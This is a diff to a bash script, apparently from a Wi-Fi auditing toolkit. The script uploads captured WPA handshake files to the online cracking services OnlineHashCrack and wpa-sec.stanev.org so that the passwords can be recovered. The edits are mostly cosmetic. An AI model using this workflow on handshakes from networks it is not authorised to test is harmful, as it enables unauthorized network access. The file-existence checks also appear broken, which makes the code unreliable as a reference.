@@ -74,8 +74,6 @@ gzip_files() {
 }
 
 upload_func() {
-   clear
-  source "${scripts_dir}/support/support-Banner_func.sh"
   if [[ $(find "${handshakes_dir}" -maxdepth 1 \( -name '*.cap' -o -name '*.pcap' -o -name '*.pcap-ng' \) -type f -print -quit | grep -q '.') ]]; then
     wlancap2wpasec -u https://api.onlinehashcrack.com -e "$pro_email" "${handshakes_dir}"/*.pcap
     printf " ${GN} [*] ${CY}Send all cap's to OHC.${OG}\\n"
@@ -85,13 +83,9 @@ upload_func() {
   printf " ${GN} [X] ${WT}Gzip ${CY}is not supported on ${WT}OnlineHashCrack${CY}.\\n ${GN} [*] ${CY}Uploading ${WT}hccapx ${CY}files to ${WT}OHC.${OG}\\n"
 
   if [[ $(find "${backup_dir}/root/hccapx" -maxdepth 1 -name '*.hccapx' -type f -print -quit | grep -q '.') ]]; then
-    wlancap2wpasec -u https://api.onlinehashcrack.com -e "$pro_email" \
-      "${backup_dir}/root/hccapx/*.hccapx"
+    wlancap2wpasec -u https://api.onlinehashcrack.com -e "$pro_email" "${backup_dir}/root/hccapx/*.hccapx"
     printf " ${GN} [X] ${CY}HCCAPX isn't supported on WPA-Stanev.\\n"
   fi
-  clear
-}
-
 }
 
 gzip_upload() {
@@ -108,14 +102,12 @@ gzip_upload() {
   fi
   if [[ $(find "${handshakes_dir}" -maxdepth 1 -name '*.gz' -type f -print -quit | grep -q '.') ]]; then
     printf " ${GN} [*] ${CY}Send all compressed ${WT}pcap's${CY} to ${WT}WPA-Stanev${CY}.\\n ${GN} [*] ${CY}Remove successful uploads.${OG}\\n"
-    wlancap2wpasec -k "$wpa_api" -t 45 -R \
-      "${handshakes_dir}"/*.pcap.gz
+    wlancap2wpasec -k "$wpa_api" -t 45 -R "${handshakes_dir}"/*.pcap.gz
     printf " ${GN} [*] ${CY}Send all compressed ${WT}cap's${CY} to ${WT}WPA-Stanev${CY}.\\n ${GN} [*] ${CY}Remove successful uploads.${OG}\\n"
-    wlancap2wpasec -k "$wpa_api" -t 45 \
-      "${handshakes_dir}"/*.cap.gz
+    wlancap2wpasec -k "$wpa_api" -t 45 -R "${handshakes_dir}"/*.cap.gz
   else
-    printf " No *.gz files to upload.\\n"
-  fi
+    printf " ${RED}No .gz files to upload.\\n"
+fi
 }
 
 main() {
@@ -159,4 +151,3 @@ printf "${CY}  All Operations completed. Cracked passwords will start appearing 
 printf "${WT}  https://www.OnlineHashCrack.com ${CY}and ${WT}https://wpa-sec.stanev.org ${CY}within 24 hours.\n"
 printf "      ${GN}Press ${WT}any${GN} key to return to ${WT}Main Menu${GN}.\n "
 read -n 1 -r -t 300
-
